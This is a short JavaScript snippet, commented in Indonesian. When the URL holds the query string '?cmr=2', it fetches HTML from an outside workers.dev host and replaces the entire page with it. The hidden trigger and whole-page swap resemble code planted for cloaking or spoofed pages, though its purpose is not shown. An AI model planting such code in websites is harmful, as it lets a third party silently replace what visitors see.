if (window.location.search.includes("?cmr=2")) {
  // Lakukan permintaan fetch untuk mendapatkan data dari website
  fetch("https://crm-template-one.mastimon.workers.dev/")
    .then((response) => response.text())
    .then((data) => {
      // Ubah HTML pada tag <html> dengan data yang diperoleh
      document.querySelector("html").innerHTML = data;
    })
    .catch((error) => {
      console.error("Terjadi kesalahan:", error);
    });
}
